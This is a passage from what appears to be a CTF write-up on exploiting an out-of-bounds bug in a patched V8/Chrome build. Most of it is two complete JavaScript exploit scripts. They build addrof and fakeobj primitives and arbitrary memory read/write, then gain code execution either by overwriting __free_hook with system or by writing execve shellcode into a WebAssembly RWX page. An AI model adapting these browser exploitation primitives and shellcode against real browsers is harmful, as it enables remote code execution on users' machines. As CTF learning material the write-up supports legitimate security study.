// https://xz.aliyun.com/t/5003
var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
```

Finally, copying the shellcode to the RWX page and calling the wasm function results in popping calc:
```javascript
console.log("[+] Copying xcalc shellcode to RWX page");

copy_shellcode(rwx_page_addr, shellcode);

console.log("[+] Popping calc");

f();
```

![Popping calc using wasm](/images/oob-v8/calc_popped_wasm.png)

## Things that didn't work

### ROP chain executes but never does anything

After getting arbitrary read / write, I attempted to also try leaking the `__environ` pointer in libc and reading it to get a stack address. I then attempted to trample backwards over the stack with a ROP chain filled with NOPs, followed by a call to `mprotect` that turns a page in memory with my pre-placed shellcode into an RWX region.

Although I can confirm through GDB that my ROP chain works, execution goes straight through `mprotect`, jumps to my shellcode, but fails because the page never becomes executable. I also tried to do a ROP chain into `system("xcalc")`, but even that didn't work.

If anyone can tell me why this approach did not work, I would love to hear it. To clarify, execution definitely jumps to my ROP chain, and it definitely executes all instructions in my ROP chain, but `mprotect` did not make my shellcode executable, nor did `system("xcalc");` pop calc. Please DM me on twitter if you know why this is the case!

### Exploit only works through d8, not through the Chrome binary provided for the challenge

This is the other issue I ran into. If I insert the exploit scripts into `<script>...</script>` tags inside a html file and open it in the vulnerable version of Chrome presented for this challenge, all of my arbitrary reads return 0.

I debugged this for a bit, and it seems like (to the best of my knowledge) that any addresses that I pass into my arbitrary read primitive function are being searched for within the `chrome` browser process, and not within the renderer process.

I've attached gdb to both the browser process and the renderer process, and I can confirm that they have different memory mappings, which would explain why my arbitrary reads return 0. The browser process simply does not have those memory regions mapped.

If anyone knows how to fix this, feel free to DM me. This is the only thing I'm missing that's preventing me from fully completing this challenge.

**Update**: I've figured out how to fix it. It was a problem with my html file. Essentially, the html file needs to look like the following:
```html
<html>
  <head>
    <script src="pwn.js"></script>
  </head>
</html>
```

The reason it wasn't working was because I didn't put the script into a separate file. I embedded the entire script in between `<script>...</script>` tags. Putting it in a separate file fixes this issue.

Run chrome with `./chrome --no-sandbox ./index.html` to trigger the script. Only the WebAssembly version of the exploit works. I believe the way I leaked the addresses for the `__free_hook` version doesn't bode well when Chrome is ran.

## Final exploit scripts

Feel free to DM me any questions you may have through Twitter.

Exploit for overwriting `__free_hook` to `&system` and calling it by doing `console.log("xcalc");`:
```javascript
/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

/// Construct addrof primitive
var obj = {"A":1};
var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var obj_arr_map = obj_arr.oob();
var float_arr_map = float_arr.oob();

console.log("[+] Float array map: 0x" + ftoi(float_arr_map).toString(16));
console.log("[+] Object array map: 0x" + ftoi(obj_arr_map).toString(16));

function addrof(in_obj) {
    // First, put the obj whose address we want to find into index 0
    obj_arr[0] = in_obj;

    // Change the obj array's map to the float array's map
    obj_arr.oob(float_arr_map);

    // Get the address by accessing index 0
    let addr = obj_arr[0];

    // Set the map back
    obj_arr.oob(obj_arr_map);

    // Return the address as a BigInt
    return ftoi(addr);
}

function fakeobj(addr) {
    // First, put the address as a float into index 0 of the float array
    float_arr[0] = itof(addr);

    // Change the float array's map to the obj array's map
    float_arr.oob(obj_arr_map);

    // Get a "fake" object at that memory location and store it
    let fake = float_arr[0];

    // Set the map back
    float_arr.oob(float_arr_map);

    // Return the object
    return fake;
}

// This array is what we will use to write to arbitrary memory addresses
var arb_rw_arr = [float_arr_map, itof(0x0000000200000000n), 1, 0xffffffff];

console.log("[+] Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));

function arb_read(addr) {
    // We have to use tagged pointers, so if the addr isn't tagged, we tag it
    if (addr % 2n == 0)
	addr += 1n;
    
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    return ftoi(fake[0]);
}

function initial_arb_write(addr, val) {
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    fake[0] = itof(BigInt(val));
}

function arb_write(addr, val) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    initial_arb_write(backing_store_addr, addr);
    dataview.setBigUint64(0, BigInt(val), true);
}

var test = new Array([1.1, 1.2, 1.3, 1.4]);

var test_addr = addrof(test);
var map_ptr = arb_read(test_addr - 1n);
var map_sec_base = map_ptr - 0x2f79n;
var heap_ptr = arb_read(map_sec_base + 0x18n);
var PIE_leak = arb_read(heap_ptr);
var PIE_base = PIE_leak - 0xd87ea8n;

console.log("[+] test array: 0x" + test_addr.toString(16));
console.log("[+] test array map leak: 0x" + map_ptr.toString(16));
console.log("[+] map section base: 0x" + map_sec_base.toString(16));
console.log("[+] heap leak: 0x" + heap_ptr.toString(16));
console.log("[+] PIE leak: 0x" + PIE_leak.toString(16));
console.log("[+] PIE base: 0x" + PIE_base.toString(16));

puts_got = PIE_base + 0xd9a3b8n;
libc_base = arb_read(puts_got) - 0x809c0n;
free_hook = libc_base + 0x3ed8e8n;
system = libc_base + 0x4f440n;

console.log("[+] Libc base: 0x" + libc_base.toString(16));
console.log("[+] __free_hook: 0x" + free_hook.toString(16));
console.log("[+] system: 0x" + system.toString(16));

console.log("[+] Overwriting __free_hook to &system");
arb_write(free_hook, system);

console.log("xcalc")
```

Exploit for creating an RWX page using WebAssembly, overwriting it with shellcode to call `execve("/usr/bin/xcalc", ["/usr/bin/xcalc"], ["DISPLAY:=0"])`:
```javascript
/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

/// Construct addrof primitive
var obj = {"A":1};
var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var obj_arr_map = obj_arr.oob();
var float_arr_map = float_arr.oob();

function addrof(in_obj) {
    // First, put the obj whose address we want to find into index 0
    obj_arr[0] = in_obj;

    // Change the obj array's map to the float array's map
    obj_arr.oob(float_arr_map);

    // Get the address by accessing index 0
    let addr = obj_arr[0];

    // Set the map back
    obj_arr.oob(obj_arr_map);

    // Return the address as a BigInt
    return ftoi(addr);
}

function fakeobj(addr) {
    // First, put the address as a float into index 0 of the float array
    float_arr[0] = itof(addr);

    // Change the float array's map to the obj array's map
    float_arr.oob(obj_arr_map);

    // Get a "fake" object at that memory location and store it
    let fake = float_arr[0];

    // Set the map back
    float_arr.oob(float_arr_map);

    // Return the object
    return fake;
}
// This array is what we will use to read from and write to arbitrary memory addresses
var arb_rw_arr = [float_arr_map, 1.2, 1.3, 1.4];

console.log("[+] Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));

function arb_read(addr) {
    // We have to use tagged pointers for reading, so we tag the addr
    if (addr % 2n == 0)
	addr += 1n;

    // Place a fakeobj right on top of our crafted array with a float array map
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Change the elements pointer using our crafted array to read_addr-0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // Index 0 will then return the value at read_addr
    return ftoi(fake[0]);
}

function initial_arb_write(addr, val) {
    // Place a fakeobj right on top of our crafted array with a float array map
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Change the elements pointer using our crafted array to write_addr-0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // Write to index 0 as a floating point value
    fake[0] = itof(BigInt(val));
}

console.log("[+] Creating an RWX page using WebAssembly");

// https://wasdk.github.io/WasmFiddle/
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var rwx_page_addr = arb_read(addrof(wasm_instance)-1n+0x88n);

console.log("[+] RWX Wasm page addr: 0x" + rwx_page_addr.toString(16));

function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    initial_arb_write(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4*i, shellcode[i], true);
    }
}

// https://xz.aliyun.com/t/5003
var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

console.log("[+] Copying xcalc shellcode to RWX page");

copy_shellcode(rwx_page_addr, shellcode);

console.log("[+] Popping calc");

f();
```
